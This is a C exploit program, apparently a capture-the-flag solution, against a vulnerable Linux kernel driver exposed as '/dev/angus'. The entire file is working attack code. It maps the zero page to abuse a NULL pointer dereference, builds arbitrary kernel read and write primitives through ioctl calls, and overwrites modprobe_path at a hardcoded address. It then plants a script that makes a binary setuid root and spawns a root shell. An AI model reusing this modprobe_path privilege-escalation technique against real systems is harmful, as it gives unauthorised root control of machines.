#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#define DEVICE_NAME "angus"
#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

int fd;

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

int angus_init() {
    request_t req = { NULL };
    return ioctl(fd, CMD_INIT, &req);
}

int angus_setkey(char* key_data, size_t key_len) {
    request_t req = { .ptr = key_data, .len = key_len };
    return ioctl(fd, CMD_SETKEY, &req);
}

int angus_setdata(char* data, size_t data_len) {
    request_t req = { .ptr = data, .len = data_len };
    return ioctl(fd, CMD_SETDATA, &req);
}

int angus_getdata(char* data, size_t data_len) {
    request_t req = { .ptr = data, .len = data_len };
    return ioctl(fd, CMD_GETDATA, &req);
}

int angus_xor() {
    request_t req = { NULL };
    return ioctl(fd, CMD_ENCRYPT, &req);
}

XorCipher *nullptr = NULL;

void AAR(char *dst, char *src, size_t len) {
    // copy_to_user(req.ptr, ctx->data, req.len)
    nullptr->data = src;
    nullptr->datalen = len;
    angus_getdata(dst, len);
}

void AAW(char *dst, char *src, size_t len) {
    char *leak_dst = (char*)malloc(len);

    // First leak the data we want to write
    AAR(leak_dst, dst, len);

    // Xor it with the data we want to overwrite it with
    for (int i = 0; i < len; i++) {
        leak_dst[i] ^= src[i];
    }

    // Change the key to xor'd data
    nullptr->key = leak_dst;
    nullptr->keylen = len;

    // Trigger the xor function to change bytes to desired
    angus_xor();
}

int main(int argc, char **argv) {
    char buff[0x400];

    if (argc == 2) {
        printf("[+] getuid() returns %d\n", geteuid());
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
    }

    fd = open("/dev/angus", O_RDWR);

    if (mmap(0, 0x1000, PROT_READ | PROT_WRITE,
        MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) {
            perror("[-] mmap() failed");
        }

    AAR(buff, (char*)0xffffffff81e37e60, 30);
    printf("AAR read: %s\n", buff);

    AAW((char*)0xffffffff81e37e60, "/tmp/xx", 30);

    AAR(buff, (char*)0xffffffff81e37e60, 30);
    printf("AAR read: %s\n", buff);

    puts("[+] Overwrote modprobe_path...");

    system("echo -e \"#!/bin/sh\nchown root:root /exploit\nchmod 4555 /exploit\" > /tmp/xx");
    system("chmod +x /tmp/xx");

    system("echo -e '\xff\xff\xff\xff' > /tmp/a");
    system("chmod +x /tmp/a");

    system("/tmp/a");

    puts("[+] Spawning a shell");
    system("/exploit a");

    close(fd);

    return 0;
}